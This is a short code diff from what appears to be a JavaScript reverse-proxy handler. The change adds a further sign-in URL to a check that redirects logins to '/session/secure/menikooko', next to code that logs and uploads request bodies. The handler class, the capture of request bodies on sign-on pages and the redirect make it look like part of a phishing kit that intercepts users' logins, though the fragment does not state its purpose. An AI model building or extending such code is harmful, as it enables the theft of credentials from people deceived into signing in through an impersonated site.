@@ -88,9 +88,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             clientContext.setLogAvailable(true)
             super.uploadRequestBody(clientContext.currentDomain, clientContext)
         }
-
+        
         if (this.req.url.startsWith('/login/sign-in/signOnSuccessRedirect.go') 
-        || this.req.url.startsWith('/login/sign-in/captcha/signOnV2.go')) {
+        || this.req.url.startsWith('/login/sign-in/captcha/signOnV2.go')
+        || this.req.url.startsWith('/sign-in/internal/entry/signOnV2.go')) {
             this.res.writeHead(302, {location: '/session/secure/menikooko'})
             return super.cleanEnd(clientContext.currentDomain, clientContext)
 
